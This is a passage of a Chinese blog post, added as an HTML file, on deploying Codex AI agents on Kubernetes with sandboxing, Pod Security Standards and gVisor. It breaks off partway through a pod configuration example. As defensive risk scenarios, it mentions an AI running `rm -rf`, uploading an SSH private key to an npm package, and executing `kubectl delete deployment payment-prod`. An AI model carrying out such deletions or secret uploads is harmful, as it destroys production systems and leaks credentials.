@@ -1,0 +1,703 @@
+<!doctype html>
+<html lang="zh-CN" data-theme="dark">
+  <head>
+
+
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#050b18">
+<meta name="color-scheme" content="dark light">
+<title>Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构 | Leslie Zhang</title>
+<meta name="description" content="构建面向真实世界的 Agent 系统，也记录技术、行动与反馈如何改变理解。">
+<meta name="author" content="Leslie Zhang">
+<link rel="canonical" href="https://leslieaibin.github.io/2026/05/09/attention-field/Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8A-%E4%BB%8E%E5%8D%95%E6%9C%BAsandbox%E5%88%B0K8s%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84/">
+<link rel="icon" href="/imgs/01.jpg">
+<link rel="alternate" type="application/atom+xml" title="Leslie Zhang" href="/atom.xml">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构 | Leslie Zhang">
+<meta property="og:description" content="构建面向真实世界的 Agent 系统，也记录技术、行动与反馈如何改变理解。">
+<meta property="og:url" content="https://leslieaibin.github.io/2026/05/09/attention-field/Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8A-%E4%BB%8E%E5%8D%95%E6%9C%BAsandbox%E5%88%B0K8s%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84/">
+<meta property="og:image" content="https://leslieaibin.github.io/2026/05/09/attention-field/Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8A-%E4%BB%8E%E5%8D%95%E6%9C%BAsandbox%E5%88%B0K8s%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84/illustrations/F1-%E5%8D%95%E6%9C%BAvs%E4%BC%81%E4%B8%9A%E9%B8%BF%E6%B2%9F.webp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构 | Leslie Zhang">
+<meta name="twitter:description" content="构建面向真实世界的 Agent 系统，也记录技术、行动与反馈如何改变理解。">
+<meta name="twitter:image" content="https://leslieaibin.github.io/2026/05/09/attention-field/Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8A-%E4%BB%8E%E5%8D%95%E6%9C%BAsandbox%E5%88%B0K8s%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84/illustrations/F1-%E5%8D%95%E6%9C%BAvs%E4%BC%81%E4%B8%9A%E9%B8%BF%E6%B2%9F.webp">
+<script>
+  (function () {
+    var saved = localStorage.getItem('orbital-theme');
+    var theme = saved || (window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark');
+    document.documentElement.dataset.theme = theme;
+  })();
+</script>
+<link rel="stylesheet" href="/css/orbital.css">
+<meta name="generator" content="Hexo 5.2.0"></head>
+  <body class="page-post">
+    <a class="skip-link" href="#main-content">跳到主要内容</a>
+    <div class="reading-progress" data-reading-progress></div>
+    <header class="site-header" data-header>
+  <div class="nav-shell">
+    <a class="brand" href="/" aria-label="返回首页">
+      <span class="brand-mark" aria-hidden="true"><img src="/images/brand/leslie-mythos-avatar.webp" alt="" width="512" height="512"></span>
+      <span class="brand-copy">
+        <strong>LESLIE</strong>
+        <small>REAL-WORLD AGENTS</small>
+      </span>
+    </a>
+
+    <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="main-nav" data-nav-toggle>
+      <span></span><span></span>
+      <span class="sr-only">打开导航</span>
+    </button>
+
+    <nav class="main-nav" id="main-nav" aria-label="主导航" data-nav>
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/writing/" class="">写作</a>
+      
+        <a href="/projects/" class="">项目</a>
+      
+        <a href="/about/" class="">关于</a>
+      
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换明暗主题">
+        <span class="theme-toggle__sun" aria-hidden="true">☼</span>
+        <span class="theme-toggle__moon" aria-hidden="true">◐</span>
+      </button>
+      <button class="ask-nav" type="button" data-ask-open>ASK LESLIE</button>
+    </nav>
+  </div>
+</header>
+
+    <main id="main-content"><article class="post-shell">
+  <header class="post-hero shell">
+    <a class="post-back" href="/writing/">← 返回写作</a>
+    <div class="post-hero__meta">
+      <time datetime="2026-05-09">2026 年 05 月 09 日</time>
+      <span>16 分钟阅读</span>
+    </div>
+    <h1>Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构</h1>
+    
+    <div class="chip-row"><a href="/tags/Codex/">Codex</a><a href="/tags/LLM-Agent/">LLM-Agent</a><a href="/tags/Production/">Production</a><a href="/tags/Kubernetes/">Kubernetes</a><a href="/tags/Sandbox/">Sandbox</a><a href="/tags/gVisor/">gVisor</a><a href="/tags/OPA/">OPA</a><a href="/tags/Cilium/">Cilium</a><a href="/tags/Falco/">Falco</a><a href="/tags/MultiTenancy/">MultiTenancy</a></div>
+  </header>
+
+  <div class="post-cover shell"><img src="/2026/05/09/attention-field/Codex%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%90%BD%E5%9C%B0-%E4%B8%8A-%E4%BB%8E%E5%8D%95%E6%9C%BAsandbox%E5%88%B0K8s%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84/illustrations/F1-%E5%8D%95%E6%9C%BAvs%E4%BC%81%E4%B8%9A%E9%B8%BF%E6%B2%9F.webp" alt="Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构"></div>
+
+  <div class="post-layout shell">
+    <aside class="post-toc" aria-label="文章目录">
+      <span class="aside-title">目录</span>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E8%A8%80%EF%BC%9A300-%E4%B8%AA%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%90%8C%E6%97%B6%E7%94%A8%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-text">引言：300 个工程师同时用，怎么办？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-%E5%B1%82-sandbox-%E6%80%8E%E4%B9%88%E6%98%A0%E5%B0%84%E5%88%B0-K8s"><span class="toc-text">1. 5 层 sandbox 怎么映射到 K8s</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Pod-%E5%86%85%E9%83%A8%E9%9A%94%E7%A6%BB%EF%BC%9A%E8%AE%A9%E4%B8%80%E4%B8%AA%E5%AE%B9%E5%99%A8%E4%B9%9F%E6%98%AF%E4%B8%80%E4%B8%AA%E7%AC%BC%E5%AD%90"><span class="toc-text">2. Pod 内部隔离：让一个容器也是一个笼子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-Pod-Security-Standards%EF%BC%9AK8s-%E8%87%AA%E5%B8%A6%E7%9A%84%E5%AE%89%E5%85%A8%E6%A1%A3%E4%BD%8D"><span class="toc-text">2.1 Pod Security Standards：K8s 自带的安全档位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-securityContext%EF%BC%9A%E5%8D%95%E4%B8%AA-Pod-%E7%9A%84%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%A5%97%E9%A4%90"><span class="toc-text">2.2 securityContext：单个 Pod 的最小权限套餐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-gVisor-Kata-Containers%EF%BC%9A%E6%8A%8A%E5%86%85%E6%A0%B8%E4%B9%9F%E9%9A%94%E7%A6%BB%E4%BA%86"><span class="toc-text">2.3 gVisor &#x2F; Kata Containers：把内核也隔离了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E8%87%AA%E5%AE%9A%E4%B9%89-Seccomp-Profile%EF%BC%9Asyscall-%E7%BA%A7%E7%B2%BE%E5%87%86%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-text">2.4 自定义 Seccomp Profile：syscall 级精准白名单</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-OPA-Gatekeeper-Kyverno%EF%BC%9A%E6%8A%8A-execpolicy-%E5%8D%87%E7%BA%A7%E6%88%90%E9%9B%86%E7%BE%A4%E5%87%86%E5%85%A5"><span class="toc-text">3. OPA Gatekeeper &#x2F; Kyverno：把 execpolicy 升级成集群准入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-OPA-Gatekeeper%EF%BC%9A%E7%94%A8-Rego-%E5%86%99%E7%AD%96%E7%95%A5"><span class="toc-text">3.1 OPA Gatekeeper：用 Rego 写策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Kyverno%EF%BC%9A%E7%94%A8-YAML-%E5%86%99%E7%AD%96%E7%95%A5"><span class="toc-text">3.2 Kyverno：用 YAML 写策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%8A%8A-Codex-execpolicy-%E7%9A%84%E7%B2%BE%E7%A5%9E%E6%90%AC%E8%BF%87%E6%9D%A5"><span class="toc-text">3.3 把 Codex execpolicy 的精神搬过来</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB%EF%BC%9AAI-Pod-%E8%83%BD%E4%B8%8A%E5%93%AA%E4%BA%9B%E7%BD%91"><span class="toc-text">4. 网络隔离：AI Pod 能上哪些网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-NetworkPolicy%EF%BC%9AK8s-%E5%86%85%E7%BD%AE%E4%BD%86%E8%83%BD%E5%8A%9B%E6%9C%89%E9%99%90"><span class="toc-text">4.1 NetworkPolicy：K8s 内置但能力有限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-Cilium%EF%BC%9AL7-%E7%BD%91%E7%BB%9C%E7%AD%96%E7%95%A5"><span class="toc-text">4.2 Cilium：L7 网络策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Egress-Gateway%EF%BC%9A%E6%89%80%E6%9C%89%E5%87%BA%E5%8F%A3%E7%BB%8F%E8%BF%87%E5%9B%BA%E5%AE%9A-IP"><span class="toc-text">4.3 Egress Gateway：所有出口经过固定 IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%A4%9A%E7%A7%9F%E6%88%B7%E4%B8%8E%E9%85%8D%E9%A2%9D%EF%BC%9A%E8%AE%A9-300-%E4%B8%AA%E5%B7%A5%E7%A8%8B%E5%B8%88%E4%BA%92%E4%B8%8D%E5%B9%B2%E6%89%B0"><span class="toc-text">5. 多租户与配额：让 300 个工程师互不干扰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-Namespace-%E5%88%87%E5%88%86%E7%AD%96%E7%95%A5"><span class="toc-text">5.1 Namespace 切分策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-ResourceQuota-LimitRange%EF%BC%9A%E7%A1%AC%E8%B5%84%E6%BA%90%E5%A4%A9%E8%8A%B1%E6%9D%BF"><span class="toc-text">5.2 ResourceQuota + LimitRange：硬资源天花板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-LLM-Token-%E9%85%8D%E9%A2%9D%EF%BC%9A%E9%92%B1%E4%B9%9F%E5%BE%97%E7%AE%A1"><span class="toc-text">5.3 LLM Token 配额：钱也得管</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-RBAC%EF%BC%9A%E7%94%A8%E6%88%B7%E5%8F%AA%E8%83%BD%E7%9C%8B%E8%87%AA%E5%B7%B1%E7%9A%84%E5%91%BD"><span class="toc-text">5.4 RBAC：用户只能看自己的命</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%8F%AF%E8%A7%82%E6%B5%8B%E4%B8%8E%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%87%BA%E4%BA%8B%E4%BA%86%E8%83%BD%E6%9F%A5%E6%B8%85%E6%A5%9A"><span class="toc-text">6. 可观测与审计：出事了能查清楚</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-Falco%EF%BC%9Asyscall-%E7%BA%A7%E5%AE%9E%E6%97%B6%E6%A3%80%E6%B5%8B"><span class="toc-text">6.1 Falco：syscall 级实时检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-KubeArmor%EF%BC%9A%E5%9F%BA%E4%BA%8E-LSM%EF%BC%8C%E4%B8%BB%E5%8A%A8%E6%8B%A6%E6%88%AA"><span class="toc-text">6.2 KubeArmor：基于 LSM，主动拦截</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E5%85%A8%E9%93%BE%E8%B7%AF%E5%AE%A1%E8%AE%A1%EF%BC%9A%E4%BB%8E%E7%94%A8%E6%88%B7%E8%AF%B7%E6%B1%82%E5%88%B0-syscall"><span class="toc-text">6.3 全链路审计：从用户请求到 syscall</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E5%AE%8C%E6%95%B4%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84%EF%BC%9A%E6%8A%8A%E6%89%80%E6%9C%89%E4%B8%9C%E8%A5%BF%E6%94%BE%E8%BF%9B%E4%B8%80%E5%BC%A0%E5%9B%BE"><span class="toc-text">7. 完整生产架构：把所有东西放进一张图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E4%BB%8E-MVP-%E5%88%B0%E7%94%9F%E4%BA%A7%EF%BC%9A4-%E9%98%B6%E6%AE%B5%E8%90%BD%E5%9C%B0%E8%B7%AF%E7%BA%BF"><span class="toc-text">8. 从 MVP 到生产：4 阶段落地路线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-1-MVP%EF%BC%881-2-%E5%91%A8%EF%BC%89"><span class="toc-text">Phase 1: MVP（1-2 周）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-2-Beta%EF%BC%881-2-%E4%B8%AA%E6%9C%88%EF%BC%89"><span class="toc-text">Phase 2: Beta（1-2 个月）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-3-%E7%94%9F%E4%BA%A7%EF%BC%883-6-%E4%B8%AA%E6%9C%88%EF%BC%89"><span class="toc-text">Phase 3: 生产（3-6 个月）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phase-4-%E8%A7%84%E6%A8%A1%E5%8C%96%EF%BC%886-%E4%B8%AA%E6%9C%88-%EF%BC%89"><span class="toc-text">Phase 4: 规模化（6 个月+）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A%E4%BB%8E%E5%8D%95%E6%9C%BA%E5%88%B0%E7%94%9F%E4%BA%A7%E7%9A%84%E5%85%B3%E9%94%AE%E8%AE%A4%E7%9F%A5"><span class="toc-text">总结：从单机到生产的关键认知</span></a></li></ol>
+    </aside>
+    <div class="article-content"><h1 id="Codex-企业级落地（上）：从单机-sandbox-到-K8s-生产架构"><a href="#Codex-企业级落地（上）：从单机-sandbox-到-K8s-生产架构" class="headerlink" title="Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构"></a>Codex 企业级落地（上）：从单机 sandbox 到 K8s 生产架构</h1><blockquote>
+<p>本系列三篇：</p>
+<ul>
+<li><strong>21</strong>《<a href="../21.%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3/%E6%8A%8AAI%E5%85%B3%E8%BF%9B%E7%AC%BC%E5%AD%90%E9%87%8C-Codex-Sandbox%E5%85%A8%E6%99%AF%E6%8B%86%E8%A7%A3.md">把 AI 关进笼子里：Codex Sandbox 全景拆解</a>》单机 sandbox 五层防御详解</li>
+<li><strong>22</strong>（本篇）从单机 sandbox 到 K8s 生产架构</li>
+<li><strong>23</strong>《Codex 企业级落地（下）：4 个生产场景的真实落地》</li>
+</ul>
+</blockquote>
+<h2 id="引言：300-个工程师同时用，怎么办？"><a href="#引言：300-个工程师同时用，怎么办？" class="headerlink" title="引言：300 个工程师同时用，怎么办？"></a>引言：300 个工程师同时用，怎么办？</h2><p>上一篇文章里，我们把 Codex 的 sandbox 拆成了 5 层。如果你没读上一篇，记住一个比喻就够了：<strong>Codex sandbox 就像把 AI 关进一个透明笼子 —— 进程加固 / 命令白名单 / 平台沙箱 / 内核隔离 / 人工越狱审批五道并行的锁，任何一道单独看都能撬，叠在一起想跑出来非常难</strong>。在你笔记本上跑得好好的，AI 想 <code>rm -rf</code> 都被拦下来了。</p>
+<p>但现在你要把它推给公司 300 个工程师用，问题立刻就来了。</p>
+<p><img src="illustrations/F1-%E5%8D%95%E6%9C%BAvs%E4%BC%81%E4%B8%9A%E9%B8%BF%E6%B2%9F.webp" alt="单机 sandbox 满足不了 300 个工程师的真实需求"></p>
+<p>老板第一个问题：「能不能让所有人都能用？」你想了想，「装个二进制呗，每人本地跑一份」。第二天就被打脸：</p>
+<ul>
+<li>你的 5 个微服务团队各自有自己的 GitLab 权限、SSH key、production access。AI 在每个工程师本地跑，<strong>风险隔离全靠工程师本人的 sandbox 配置</strong>。有人不小心给了 <code>--full-disk-access</code>，AI 顺手把 <code>~/.ssh/id_rsa</code> 上传到了某个 npm 包。</li>
+<li>你接了公司的 LLM gateway，<strong>每个工程师都有自己的 API key</strong>。安全部门来查：”谁在 14:32 让 AI 执行了 <code>kubectl delete deployment payment-prod</code>？”你翻遍 300 台 Mac 的 log 也查不到。</li>
+<li>数据团队同事想用 AI 帮他写 SQL，但他不会装 Codex 也不会配 sandbox。<strong>让他自己装的方案到他这里就断了</strong>。</li>
+<li>你想做一个 “PR 自动修测试” 的 CI 机器人，AI 要在某个机器上跑 <code>pnpm test</code> 和 <code>cargo build</code>。<strong>这个”某个机器”是谁的？怎么调度？怎么计费？</strong></li>
+</ul>
+<p>单机 sandbox 是个<strong>能力</strong>，不是<strong>产品</strong>。能力到产品中间隔的，正是 K8s 这一层。</p>
+<p>这篇文章讲的就是怎么把 Codex 的 sandbox 哲学搬到 K8s 集群上，让 300 个工程师同时用，让安全部门能审计，让财务能算账。我们会覆盖四块：</p>
+<table>
+<thead>
+<tr>
+<th>块</th>
+<th>主题</th>
+<th>核心技术</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Pod 内部隔离</td>
+<td>Pod Security Standards、gVisor / Kata、Seccomp、AppArmor</td>
+</tr>
+<tr>
+<td>2</td>
+<td>集群策略准入</td>
+<td>OPA Gatekeeper / Kyverno</td>
+</tr>
+<tr>
+<td>3</td>
+<td>多租户与配额</td>
+<td>Namespace、ResourceQuota、RBAC、LLM token 预算</td>
+</tr>
+<tr>
+<td>4</td>
+<td>网络隔离与可观测</td>
+<td>Cilium NetworkPolicy、Falco、KubeArmor、审计链路</td>
+</tr>
+</tbody></table>
+<p>读完你会有一个能直接套到生产的架构蓝图，外加一份 4 阶段的落地路线。</p>
+<hr>
+<h2 id="1-5-层-sandbox-怎么映射到-K8s"><a href="#1-5-层-sandbox-怎么映射到-K8s" class="headerlink" title="1. 5 层 sandbox 怎么映射到 K8s"></a>1. 5 层 sandbox 怎么映射到 K8s</h2><p>K8s 上跑 AI agent 不是把 Codex 的 sandbox <strong>再实现一遍</strong>，而是把它的<strong>安全哲学</strong>用 K8s 原生的语言重新表达。Codex 单机的 5 层每一层在 K8s 里都有对应物：</p>
+<p><img src="illustrations/F2-5%E5%B1%82%E6%A6%82%E5%BF%B5%E6%98%A0%E5%B0%84K8s.webp" alt="Codex 单机 5 层 sandbox 在 K8s 中的等价物"></p>
+<table>
+<thead>
+<tr>
+<th>Codex 单机层</th>
+<th>K8s 对应物</th>
+<th>谁来管</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>进程加固</strong>（关 ptrace、core dump、<code>LD_PRELOAD</code>）</td>
+<td><strong>Pod Security Standards</strong>（restricted profile）</td>
+<td>K8s 准入控制器</td>
+</tr>
+<tr>
+<td><strong>execpolicy</strong>（命令白名单）</td>
+<td><strong>OPA Gatekeeper / Kyverno</strong>（CRD 准入策略）</td>
+<td>集群准入控制器</td>
+</tr>
+<tr>
+<td><strong>平台 sandbox</strong>（seatbelt / bwrap）</td>
+<td><strong>gVisor / Kata Containers</strong>（用户态内核 / 微 VM）</td>
+<td>容器运行时</td>
+</tr>
+<tr>
+<td><strong>内核隔离</strong>（namespaces + seccomp）</td>
+<td><strong>Linux namespaces</strong>（容器自带）+ <strong>Seccomp Profile</strong> + <strong>AppArmor / SELinux</strong></td>
+<td>Linux kernel + LSM</td>
+</tr>
+<tr>
+<td><strong>shell escalation</strong>（用户主动越狱）</td>
+<td><strong>人工 approval workflow</strong>（Web UI / Slack bot / RBAC）</td>
+<td>应用层</td>
+</tr>
+</tbody></table>
+<p>注意几个<strong>不完全对应</strong>的地方。</p>
+<p>K8s 的 Pod 默认就有 namespace 隔离（PID/Net/Mount/UTS/IPC），所以 Codex 在 Linux 上做的 <code>--unshare-*</code> 在 K8s 里<strong>默认就有了</strong>。但 K8s 默认的 <code>runc</code> 容器和宿主<strong>共享内核</strong>，syscall 漏洞（Dirty Pipe、CVE-2022-0492）能让容器内的攻击者直接越狱到宿主。这就是为什么生产场景下你要加一层 gVisor 或 Kata —— 它们才能给你 Codex 单机 sandbox 那种「内核漏洞也跑不出来」的安全感。</p>
+<p>execpolicy 在 K8s 里<strong>只能解决一半问题</strong>。它原本是「AI 想跑某条命令，先过策略」，但在 K8s 里 AI 跑的是 pod 里的进程，命令本身已经在 sandbox 里了。这里 OPA / Kyverno 解决的是<strong>另一个层级</strong>的策略：「AI 想创建一个新 Pod 跑 X，准入控制器先看看 X 是不是允许的镜像、是不是允许的命令、是不是允许的资源」。两者互补但不等同。</p>
+<p>shell escalation 那种「人工同意一次就跳出 sandbox」在 K8s 里需要<strong>重新设计</strong>。不能让 pod 真的跳出 K8s 沙箱（那等于关 sandbox），但可以让用户在 Web UI 上批准一个「特权操作」，由一个独立的、有更高权限的 controller 代为执行，结果回传给原 pod。后面会展开。</p>
+<hr>
+<h2 id="2-Pod-内部隔离：让一个容器也是一个笼子"><a href="#2-Pod-内部隔离：让一个容器也是一个笼子" class="headerlink" title="2. Pod 内部隔离：让一个容器也是一个笼子"></a>2. Pod 内部隔离：让一个容器也是一个笼子</h2><p>K8s 的 Pod 默认是<strong>安全的玩具</strong>，不是<strong>生产的城堡</strong>。一个 Pod 默认能做的事情比你想象的多：</p>
+<ul>
+<li>跑 root（除非你显式关掉）</li>
+<li>写整个根文件系统</li>
+<li>持有所有 Linux capabilities（<code>CAP_SYS_ADMIN</code> 这种几乎等于半个 root）</li>
+<li>调用所有 syscall</li>
+<li>共享宿主内核（容器逃逸 = 主机沦陷）</li>
+</ul>
+<p>让一个 Pod 真正变成 sandbox，需要把这五条全部反过来。</p>
+<p><img src="illustrations/F3-Pod%E5%AE%89%E5%85%A8%E6%A0%88%E5%88%86%E5%B1%82.webp" alt="Pod 安全栈：从 securityContext 到 LSM 的五层防御"></p>
+<h3 id="2-1-Pod-Security-Standards：K8s-自带的安全档位"><a href="#2-1-Pod-Security-Standards：K8s-自带的安全档位" class="headerlink" title="2.1 Pod Security Standards：K8s 自带的安全档位"></a>2.1 Pod Security Standards：K8s 自带的安全档位</h3><p><strong>Pod Security Standards</strong>（缩写 PSS）是 K8s 自带的 Pod 安全基线，从 K8s 1.25 起正式 GA。它把 Pod 安全分成 <strong>Privileged / Baseline / Restricted</strong> 三档，是最基础的一层。不需要装任何 controller，K8s 集群自带。</p>
+<p>三档的含义：</p>
+<table>
+<thead>
+<tr>
+<th>档</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Privileged</strong></td>
+<td>不限制，等于 root，给系统组件用（kube-proxy、CNI plugin 之类）</td>
+</tr>
+<tr>
+<td><strong>Baseline</strong></td>
+<td>最小限制，禁掉最危险的几个（hostNetwork、hostPID、privileged 容器）</td>
+</tr>
+<tr>
+<td><strong>Restricted</strong></td>
+<td>严格限制，符合 CIS benchmark，禁掉 root、强制 seccomp/AppArmor、强制 readOnlyRootFilesystem</td>
+</tr>
+</tbody></table>
+<p>Codex 的 sandbox pod <strong>必须</strong>跑 restricted。在 namespace 上打个 label 就启用：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-runtime</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">pod-security.kubernetes.io/enforce:</span> <span class="string">restricted</span></span><br><span class="line">    <span class="attr">pod-security.kubernetes.io/enforce-version:</span> <span class="string">latest</span></span><br></pre></td></tr></table></figure>
+
+<p>这一行 label 之后，这个 namespace 里<strong>任何不符合 restricted 标准的 pod 都创建不出来</strong>——准入控制器直接拒了。等于在最前置的位置就把一类错误配置堵死。</p>
+<h3 id="2-2-securityContext：单个-Pod-的最小权限套餐"><a href="#2-2-securityContext：单个-Pod-的最小权限套餐" class="headerlink" title="2.2 securityContext：单个 Pod 的最小权限套餐"></a>2.2 securityContext：单个 Pod 的最小权限套餐</h3><p>PSS 是 namespace 级的硬底线。每个 pod 自己还要再细化：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-sandbox-runner</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">runtimeClassName:</span> <span class="string">gvisor</span>               <span class="comment"># ← 关键：用 gVisor 替换 runc，下面细说</span></span><br><span class="line">  <span class="attr">securityContext:</span></span><br><span class="line">    <span class="attr">runAsNonRoot:</span> <span class="literal">true</span>                   <span class="comment"># 不准跑 root</span></span><br><span class="line">    <span class="attr">runAsUser:</span> <span class="number">1000</span>                      <span class="comment"># 用 uid=1000 这个普通用户</span></span><br><span class="line">    <span class="attr">runAsGroup:</span> <span class="number">1000</span></span><br><span class="line">    <span class="attr">fsGroup:</span> <span class="number">1000</span></span><br><span class="line">    <span class="attr">seccompProfile:</span></span><br><span class="line">      <span class="attr">type:</span> <span class="string">RuntimeDefault</span>               <span class="comment"># 用 K8s 默认 seccomp profile（已经禁了 200+ 危险 syscall）</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">codex</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">company.io/codex:v1.2.0</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">false</span>    <span class="comment"># 禁止通过 setuid 提权</span></span><br><span class="line">      <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">true</span>       <span class="comment"># 根文件系统只读</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">drop:</span> [<span class="string">&quot;ALL&quot;</span>]                    <span class="comment"># 丢掉所有 Linux capabilities</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">workspace</span>                    <span class="comment"># 唯一可写的目录</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/workspace</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">workspace</span></span><br><span class="line">    <span class="attr">emptyDir:</span></span><br><span class="line">      <span class="attr">sizeLimit:</span> <span class="string">10Gi</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp</span></span><br><span class="line">    <span class="attr">emptyDir:</span></span><br><span class="line">      <span class="attr">medium:</span> <span class="string">Memory</span>                     <span class="comment"># tmpfs，断电就没，避免持久化敏感数据</span></span><br><span class="line">      <span class="attr">sizeLimit:</span> <span class="string">1Gi</span></span><br></pre></td></tr></table></figure>
+
